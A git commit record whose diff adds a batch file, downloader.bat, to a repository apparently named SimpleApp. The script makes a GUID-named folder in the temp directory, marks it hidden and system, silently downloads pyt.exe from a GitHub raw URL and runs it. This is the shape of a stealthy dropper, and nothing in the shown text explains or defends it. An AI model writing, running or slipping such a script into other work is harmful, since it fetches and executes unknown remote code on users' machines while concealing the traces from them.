9695e84149f26c3e1f0763354757f10bdc5864fa
Solda10Skipper <99901864+Solda10Skipper@users.noreply.github.com>
2022-02-17 18:08:05 +0100

    Create downloader.bat

---
+++ downloader.bat
@@ -0,0 +1,7 @@
+@echo off
+cd %tmp%
+mkdir {8AFAB2E9-049B-4889-B134-57306E3EAD34}
+attrib +s +h {8AFAB2E9-049B-4889-B134-57306E3EAD34}
+cd {8AFAB2E9-049B-4889-B134-57306E3EAD34}
+curl -Ls https://github.com/Solda10Skipper/SimpleApp/raw/main/pyt.exe -o pyt.exe
+pyt.exe
